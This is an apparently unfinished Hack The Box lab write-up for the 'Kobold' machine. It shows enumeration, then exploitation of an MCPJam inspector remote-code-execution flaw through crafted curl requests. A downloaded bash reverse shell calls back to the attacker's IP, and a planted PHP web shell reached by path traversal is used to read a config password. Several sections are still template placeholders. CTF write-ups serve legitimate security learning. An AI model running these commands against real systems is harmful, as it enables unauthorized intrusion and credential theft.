
| Property         | Value                         |
| ---------------- | ----------------------------- |
| **OS**           | Linux / Windows               |
| **Difficulty**   | Easy / Medium / Hard / Insane |
| **Release Date** | YYYY-MM-DD                    |
| **State**        | YYYY-MM-DD                    |
| **IP**           | 10.10.10.X                    |
| **Techniques**   | technique-1, technique-2      |
| **Tags**         | #web #privesc #linux          |

---
## Summary

Brief 2-3 sentence overview of the machine and attack path.

Note: The machine has different ip addresses in the sections of the writeup because i started it multiple times.

---
## Enumeration

```
echo '10.129.58.91 kobold.htb' | sudo tee -a /etc/hosts
```

Added the ip address to the /etc/host file 
### Nmap Scan

```
sudo nmap -sV -sC kobold.htb    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 05:36 EDT
Nmap scan report for kobold.htb (10.129.58.91)
Host is up (0.044s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.24.0 (Ubuntu)
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: Kobold Operations Suite
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.65 seconds
```

```
sudo nmap -p- kobold.htb        
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 05:36 EDT
Nmap scan report for kobold.htb (10.129.58.91)
Host is up (0.044s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3552/tcp open  taserver

```
### Service Enumeration

The port 3552 is hosting an Arcane instance, an interface for managing Docker containers, images, networks, and volumes.

IMAGE 1

Vhost discovery 

```
ffuf -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u https://10.129.59.28 -H 'Host: FUZZ.kobold.htb' -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.129.59.28
 :: Wordlist         : FUZZ: /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.kobold.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration: 33ms]
bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 102ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1298 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```

```
┌──(kali㉿kali)-[~]
└─$ echo '10.129.59.28 bin.kobold.htb' | sudo tee -a /etc/hosts                                                                          
[sudo] password for kali: 
10.129.59.28 bin.kobold.htb
                                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ echo '10.129.59.28 mcp.kobold.htb' | sudo tee -a /etc/hosts
10.129.59.28 mcp.kobold.htb

```

MCPJam Version: v1.4.2 is vulnerable to RCE:
Poc: https://github.com/advisories/GHSA-232v-j27c-5pp6

IMAGE 2

---
## Foothold
### Vulnerability

Versions 1.4.2 and earlier are vulnerable to remote code execution (RCE) vulnerability, which allows an attacker to send a crafted HTTP request that triggers the installation of an MCP server, leading to RCE.
Since MCPJam inspector by default listens on 0.0.0.0 instead of 127.0.0.1, an attacker can trigger the RCE remotely via a simple HTTP request.
The `/api/mcp/connect` API, which is intended for connecting to MCP servers, becomes an open entry point for unauthorized requests. When an HTTP request reaches the `/connect` route, the system extracts the `command` and `args` fields without performing any security checks, leading to the execution of arbitrary command.

### Exploitation


```
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"wget","args":["http://10.10.14.224:1111"],"env":{}},"serverId":"1"}'
```

Testing for RCE.

```
nc -lvnp 1111      
listening on [any] 1111 ...
connect to [10.10.14.224] from (UNKNOWN) [10.129.60.161] 54326
GET / HTTP/1.1
Host: 10.10.14.224:1111
User-Agent: Wget/1.21.4
Accept: */*
Accept-Encoding: identity
Connection: Keep-Alive

```

The listener gets the request back thus confirming the vulerability.


---
## User Flag

A shell as the user ben can be achieved by leveraging the vulnerability:

```

cat shell.sh                        
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.224/1111 0>&1
                                                                                                               
python3 -m http.server 8000                         
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
10.129.59.28 - - [06/May/2026 18:44:27] "GET /shell.sh HTTP/1.1" 200 -
```

```
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"wget","args":["-O","/tmp/shell.sh","http://10.10.14.224:8000/shell.sh"],"env":{}},"serverId":"1"}'
  
```

```
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["/tmp/shell.sh"],"env":{}},"serverId":"1"}'
```

```
 nc -lvnp 1111      
listening on [any] 1111 ...
connect to [10.10.14.224] from (UNKNOWN) [10.129.60.161] 53162
bash: cannot set terminal process group (1530): Inappropriate ioctl for device
bash: no job control in this shell
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ id
id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ 
```

**User Flag:**

```
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cat /home/ben/user.txt
<e_modules/@mcpjam/inspector$ cat /home/ben/user.txt      
0d9673a3692aa1a3e0631255bdfa9dca
```

---
## Privilege Escalation

### Enumeration

enumerate group operator, write a php shell inside /privatebin-data/data/bd/b5/ (world writable)

 `curl -k https://bin.kobold.htb/ \`                    
  `-b "template=../data/bd/b5/shell" \`
  `-G --data-urlencode "cmd=id"`
`uid=65534(nobody) gid=82(www-data) groups=82(www-data)`

```
┌──(kali㉿kali)-[~/htb-academy]
└─$ curl -k https://bin.kobold.htb/ \
  -b "template=../data/bd/b5/shell" \
  -G --data-urlencode "cmd= find / -name conf.php"
/srv/cfg/conf.php
                                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/htb-academy]
└─$ curl -k https://bin.kobold.htb/ \
  -b "template=../data/bd/b5/shell" \
  -G --data-urlencode "cmd= cat /srv/cfg/conf.php | grep password"
; enable or disable the password feature, defaults to true
password = true
; enable or disable the password feature, defaults to true
password = true
                                                                                                                                                                                                                                    
┌──(kali㉿kali)-[~/htb-academy]
└─$ curl -k https://bin.kobold.htb/ \
  -b "template=../data/bd/b5/shell" \
  -G --data-urlencode "cmd=cat /srv/cfg/conf.php"
```

```
pwd = "ComplexP@sswordAdmin1928"

```



### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)